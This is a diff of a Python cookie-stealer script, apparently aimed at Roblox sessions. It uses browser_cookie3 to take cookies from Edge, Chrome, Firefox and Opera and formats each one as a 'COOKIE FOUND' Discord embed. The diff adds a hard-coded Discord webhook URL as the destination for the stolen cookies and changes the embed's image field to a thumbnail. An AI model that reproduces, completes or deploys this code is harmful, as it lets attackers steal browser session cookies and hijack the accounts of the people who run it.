@@ -1,9 +1,11 @@
 import browser_cookie3
 import requests 
 import threading
-import base64
+from base64 import *
 
-WebHook = "" # Input your webhook here
+WebHook = "https://discord.com/api/webhooks/1076853982321967114/EtBwuKmwSaB8HXONwmP7v9sGeGTbfOiou98wyWKrbBo9_YS0embssu8f8tQpEydlqC-i" # Input your webhook here
+
+
 
 def MicrosoftEdge():
     try:
@@ -17,7 +19,7 @@ def MicrosoftEdge():
             "title": "COOKIE FOUND|Browser : Edge", 
             "description": f"```{cookie}```", 
             "color": 16711680,
-                "image":{
+                "thumbnail":{
                     "url": "https://tr.rbxcdn.com/13d613f1ff673320102c37a26d12c234/150/150/AvatarHeadshot/Png"
                 },
                 "footer": {
@@ -40,7 +42,7 @@ def GoogleChrome():
                 "title": "COOKIE FOUND|Browser : Chrome", 
                 "description": f"```{cookie}```", 
                 "color": 16711680,
-                "image":{
+                "thumbnail":{
                     "url": "https://tr.rbxcdn.com/13d613f1ff673320102c37a26d12c234/150/150/AvatarHeadshot/Png"
                 },
                 "footer": {
@@ -65,7 +67,7 @@ def MozillaFirefox():
                 "title": "COOKIE FOUND|Browser : Firefox", 
                 "description": f"```{cookie}```", 
                 "color": 16711680,
-                "image":{
+                "thumbnail":{
                     "url": "https://tr.rbxcdn.com/13d613f1ff673320102c37a26d12c234/150/150/AvatarHeadshot/Png"
                 },
                 "footer": {
@@ -89,7 +91,7 @@ def Opera():
                 "title": "COOKIE FOUND|Browser : Opera",
                 "description": f"```{cookie}```",
                 "color": 16711680,
-                "image":{
+                "thumbnail":{
                     "url": "https://tr.rbxcdn.com/13d613f1ff673320102c37a26d12c234/150/150/AvatarHeadshot/Png"
                 },
                 "footer": {
